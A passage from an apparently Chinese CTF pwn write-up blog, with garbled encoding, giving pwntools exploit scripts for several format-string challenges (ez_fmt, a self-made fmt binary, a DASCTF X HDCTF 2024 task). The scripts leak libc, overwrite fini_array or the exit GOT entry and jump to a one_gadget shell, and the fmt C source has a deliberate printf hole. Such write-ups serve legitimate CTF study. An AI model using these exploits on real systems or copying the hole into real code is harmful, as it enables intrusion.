class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">data1,data2</span>):   <span class="comment">#payload = b&#x27;%&#x27; + str(data) + b&#x27;c&#x27; + padding + &#x27;%&#x27; + str(offset) + b&#x27;$hhn&#x27; + p64(adr)</span></span><br><span class="line">    padding1  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    padding2  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    data2     = data2-data1  </span><br><span class="line">    payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">        padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">        data1    -= <span class="built_in">len</span>(padding1)</span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload1)&lt;<span class="number">0x10</span>):</span><br><span class="line">            padding1 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>-<span class="built_in">len</span>(payload1))</span><br><span class="line">            payload1   = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data1) + <span class="string">b&#x27;c&#x27;</span> + padding1 + <span class="string">&#x27;%10$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload2 = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(payload2)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">        padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">        data2    -= <span class="built_in">len</span>(padding2)</span><br><span class="line">        payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(payload2)&lt;<span class="number">0x20</span>):</span><br><span class="line">            padding2 += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span>-<span class="built_in">len</span>(payload2))</span><br><span class="line">            payload2   = payload1 + <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(data2) + <span class="string">b&#x27;c&#x27;</span> + padding2 + <span class="string">b&#x27;%11$hn&#x27;</span></span><br><span class="line">    payload2 += p64(ret_addr) + p64(ret_addr+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> payload2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    py1 = <span class="string">b&#x27;%4198917c%9$hn%19$paaaaa&#x27;</span> + p64(printf_ret)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(py1)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]-<span class="number">243</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span> , libc_base)</span><br><span class="line">    one_gadget = libc_base + <span class="number">0xe3b01</span></span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    py2 = fmt(one_gadget&amp;<span class="number">0xffff</span>,(one_gadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">    s(py2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   </span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./ez_fmt&#x27;</span></span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.24.40&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    context.binary = pwnfile</span><br><span class="line">    libc_name  = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403DC0</span></span><br><span class="line">    main      = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">    ret_addr   = stack + <span class="number">0x68</span></span><br><span class="line">    printf_ret = stack - <span class="number">0x8</span></span><br><span class="line">    leak(<span class="string">&quot;print_ret&quot;</span>,printf_ret)</span><br><span class="line">    leak(<span class="string">&quot;ret_addr&quot;</span>,ret_addr)</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h2><p>è‡ªå·±å‡ºçš„ç»ƒæ‰‹é¢˜  æ²¡å¼€RELROï¼Œç›´æ¥æ‰“fini_arrayç»•è¿‡ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    init_func();</span><br><span class="line">    <span class="type">char</span> str[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please input your payload:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, str, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc fmt.c -no-pie -z norelro  -o fmt </span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> p64, u64, p32, u32</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#from struct import pack</span></span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data               : io.send(data)</span><br><span class="line">sl   = <span class="keyword">lambda</span> data               : io.sendline(data)</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim, data        : io.sendafter(delim,data)</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim, data        : io.sendlineafter(delim, data)</span><br><span class="line">r    = <span class="keyword">lambda</span> num=<span class="number">4096</span>           : io.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  : io.recvuntil(delims, drop)</span><br><span class="line">itr  = <span class="keyword">lambda</span>                    : io.interactive()</span><br><span class="line">r64  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">r32  = <span class="keyword">lambda</span>                    : io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">4</span>:]</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data               : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data               : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name, value        : info(<span class="string">&quot;&#123;&#125;:0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(name,value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    pwn_log_level = <span class="string">&#x27;info&#x27;</span>   <span class="comment">#&#x27;info&#x27;</span></span><br><span class="line">    pwn_arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">    pwn_os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    context(log_level=pwn_log_level, arch=pwn_arch, os=pwn_os)</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    pwnfile = <span class="string">&#x27;./fmt&#x27;</span></span><br><span class="line">    <span class="comment">#io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;&#x27;</span>,  )</span><br><span class="line">    elf = ELF(pwnfile)</span><br><span class="line">    rop = ROP(pwnfile)</span><br><span class="line">    libc_name = <span class="string">&#x27;./libc.so.6&#x27;</span>   </span><br><span class="line">    libc = ELF(libc_name) </span><br><span class="line"></span><br><span class="line">    fini_arry = <span class="number">0x0403198</span> </span><br><span class="line">    main = <span class="number">0x4011ff</span></span><br><span class="line">    printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%41$p--%43$paaaa&#x27;</span>  + fmtstr_payload(<span class="number">8</span>, &#123;fini_arry : main&#125;, numbwritten=<span class="number">34</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug() </span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x2f0</span>      <span class="comment">#0xf0 -0xe0 - 0x120</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">    leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">    one = <span class="number">0xe3b01</span> + libc_base     <span class="comment">#0xe3b01 0xe3b04 0xe3cf6 0x1075aa 0x1075b2 0x1075b7 0x1075c1</span></span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;stack:one&#125;)</span><br><span class="line">    ru(<span class="string">b&#x27;payload:&#x27;</span>)</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ã€DASCTF-X-HDCTF-2024-å…¬å¼€èµ›ã€‘ç­¾ä¸ªåˆ°å§"><a href="#ã€DASCTF-X-HDCTF-2024-å…¬å¼€èµ›ã€‘ç­¾ä¸ªåˆ°å§" class="headerlink" title="ã€DASCTF X HDCTF 2024 å…¬å¼€èµ›ã€‘ç­¾ä¸ªåˆ°å§"></a>ã€DASCTF X HDCTF 2024 å…¬å¼€èµ›ã€‘ç­¾ä¸ªåˆ°å§</h2><p>éæ ˆä¸Šä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸² </p><p>è¿œç¨‹ç¯å¢ƒï¼š2.31-0ubuntu9.15</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071529364.png" alt="image-20240607152900330"></p><p>ç»™äº†æ ˆåœ°å€ ä»¥åŠ0x100é•¿åº¦é™åˆ¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p><blockquote><p>æ€è·¯ï¼šæ”¹_exit_gotä¸ºmainåœ°å€åŒæ—¶æ³„éœ²libcï¼Œç„¶åå†æ”¹exit_gotä¸ºone_gadgetï¼Œé€€å‡ºæ—¶æ‰§è¡Œone_gadget</p></blockquote><p>å¦‚ä½•ä¿®æ”¹gotï¼Ÿ</p><p>printfæ—¶çš„æ ˆç©ºé—´  åˆ©ç”¨rsp+8 å¤„çš„è¿ç»­æŒ‡é’ˆ ï¼ˆfmtarg çœ‹ç›¸å¯¹åç§»æ‹¬å·é‡Œé¢çš„ä¸ç”¨ç®¡ï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071611393.png" alt="image-20240607161107350"></p><p>åˆ©ç”¨äºŒè¿æŒ‡é’ˆä¿®æ”¹ä»»æ„åœ°å€å€¼</p><p>ä½†æ˜¯ä¸‹é¢çš„payloadå¹¶ä¸èƒ½æˆåŠŸä¿®æ”¹gotåœ°å€   è²Œä¼¼ä½¿ç”¨%x$å®šä½çš„è¯ä¸èƒ½åœ¨åŒä¸€æ¡é“¾å­ä¸Šæ”¹ä¸¤æ¬¡  (test&gt;exit_got)   æ²¡æœ‰å°†0x401030æ”¹æˆåŠŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(test-exit_got).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%49$ln&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071615607.png" alt="image-20240607161549570"></p><p>å¦‚æœæ˜¯ä¿®æ”¹ä¸åŒé“¾ä¸Šåˆ™å¯ä»¥åŒæ—¶ä¿®æ”¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%7$ln&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-main).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c%8$ln&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071632618.png" alt="image-20240607163238561"></p><p>ç›´æ¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä½œä¸ºå ä½ç¬¦çš„è¯å¯ä»¥åœ¨ä¸€æ¡é“¾å­ä¸Šæ”¹ä¸¤æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%n&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%5c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071654277.png" alt="image-20240607165447235"></p><p>è¿™æ ·æ€è·¯å°±æ˜ç¡®äº†ï¼Œå…ˆåˆ©ç”¨äºŒè¿æŒ‡é’ˆçš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆä¿®æ”¹ç¬¬äºŒä¸ªæŒ‡é’ˆæŒ‡å‘exit_gotï¼Œç„¶ååˆ©ç”¨ç¬¬äºŒä¸ªæŒ‡é’ˆä¿®æ”¹exit_gotåœ°å€ä¸ºmainå‡½æ•°åœ°å€</p><p>ç”±äº%hnåªå°†æ‰“å°å‡ºæ¥å­—ç¬¦çš„ä½äºŒå­—èŠ‚ä¿®æ”¹å†…å­˜ï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„å­—ç¬¦é•¿åº¦æº¢å‡ºæ—¶å°±èƒ½ä¿®æ”¹ä½äºŒå­—èŠ‚ä¸ºä»»æ„å€¼äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202406071712038.png" alt="image-20240607171232992"></p><p>ç„¶åæ ˆä¸Šè¿˜æ®‹ç•™çš„æŒ‡å‘exit_gotæŒ‡é’ˆæ¥ä¿®æ”¹æˆä¸ºone_gadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;node5.buuoj.cn 29958&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.15_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        io = init(pwnfile, IPort, libc_name)</span><br><span class="line">        exit_got = elf.got[<span class="string">&#x27;_exit&#x27;</span>]</span><br><span class="line">        main     = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        ru(<span class="string">b&#x27;Gift addr: &#x27;</span>)</span><br><span class="line">        stack = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">        leak(<span class="string">&quot;stack&quot;</span>, stack)</span><br><span class="line"></span><br><span class="line">        payload1  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got-<span class="number">5</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">5</span> + <span class="string">b&#x27;%ln&#x27;</span>   <span class="comment">#7</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xd1fb</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">40</span> + <span class="string">b&#x27;%hn&#x27;</span>   <span class="comment">#49</span></span><br><span class="line">        payload1 += <span class="string">b&#x27;-%17$p&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">        sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload1) </span><br><span class="line">        ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">        libc_base = <span class="built_in">int</span>(r(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">243</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">        one_gadegt = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">        one = libc_base + one_gadegt[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        ori  = one&amp;<span class="number">0xffff</span></span><br><span class="line">        ori1 = one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>  </span><br><span class="line">        ori2 = one&gt;&gt;<span class="number">32</span>&amp;<span class="number">0xffff</span></span><br><span class="line">        ori3 = one&amp;<span class="number">0xffffffff</span></span><br><span class="line">        leak(<span class="string">&quot;one_gadet&quot;</span>, one)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori1))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(ori2))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(ori &lt; ori1 <span class="keyword">or</span> ori1 &lt; ori2):</span><br><span class="line">            log.failure(<span class="string">&quot;ori is too low...&quot;</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            payload2  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">2</span>-<span class="number">35</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">35</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>  <span class="comment">#37</span></span><br><span class="line">            <span class="comment"># payload2 = b&#x27;\x00&#x27;</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload2) </span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line"></span><br><span class="line">            payload3 = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(exit_got+<span class="number">4</span>-<span class="number">14</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span class="string">b&#x27;c&#x27;</span> + <span class="string">b&#x27;%c&#x27;</span>*<span class="number">14</span> + <span class="string">b&#x27;%ln\x00&#x27;</span>   <span class="comment">#16</span></span><br><span class="line">            <span class="comment"># payload3 = b&#x27;\x00&#x27;</span></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401366&#x27;)</span></span><br><span class="line">            sla(<span class="string">b&#x27;Please leave your message: &#x27;</span>, payload3) </span><br><span class="line"></span><br><span class="line">            payload4  = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ori2-<span class="number">38</span>).encode(<span class="string">&quot;utf-8&quot;</span>) + <span 